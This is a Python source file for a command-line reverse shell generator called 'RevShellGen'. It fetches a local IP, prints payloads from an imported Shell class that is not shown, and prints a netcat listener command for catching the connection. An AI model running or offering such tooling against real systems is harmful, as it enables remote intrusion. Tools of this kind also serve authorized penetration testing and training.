import argparse
from shells import Shell
from pyfiglet import Figlet
import netifaces as ni
import sys


class colors:
    CYAN = '\033[96m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    WHITE = '\033[37m'


def main():
    pass


def print_banner():
    figlet_custom = Figlet(font="chunky")
    banner = figlet_custom.renderText("RevShellGen")
    print(banner)


def print_local_listener(port: int, silent: bool):
    if not silent:
        local_listener = f"""
        nc -nvlp {port}
        """.strip()
        print(f"\n\n{colors.YELLOW}For local listener execute:{colors.WHITE}")
        print(f"{local_listener}\n")


def get_ip_address(interface: str):
    ni.ifaddresses(interface)
    return ni.ifaddresses(interface)[ni.AF_INET][0]['addr']


def print_payloads(shell_payloads: list, silent: bool):
    for payload in shell_payloads:
        if not silent:
            print(f"{colors.CYAN}Payload:{colors.WHITE}")
        print(f"{payload}\n")


def init_argparse():
    parser = argparse.ArgumentParser()
    parser.add_argument("--ip", type=str, help="Local IP address")
    parser.add_argument("--interface", type=str, help="Interface", default="eth0")
    parser.add_argument("--port", type=int, help="Opened port", default="8080")
    parser.add_argument("--payload", type=str, help="Define which payload to generate", default="")
    parser.add_argument("-s", "--silent", action='store_true', help="Print out only payload")
    return parser


if __name__ == "__main__":
    # arg parser
    parser = init_argparse()
    args = parser.parse_args()

    # check available payloads
    available_payloads = [method for method in dir(Shell) if callable(getattr(Shell, method)) and "__" not in method]

    if not args.silent:
        print_banner()
        print(f"{colors.YELLOW}Available payloads: {colors.WHITE}{available_payloads}\n")
        if len(sys.argv) == 1:
            parser.print_help()

    if hasattr(Shell, args.payload):
        # get IP and PORT
        ip = args.ip if args.ip else get_ip_address(args.interface)
        port = args.port
        silent = bool(args.silent)

        # generate payload
        shell = Shell(ip=ip, port=port)
        print_payloads(shell_payloads=getattr(Shell, args.payload)(shell), silent=silent)
        print_local_listener(port=port, silent=silent)
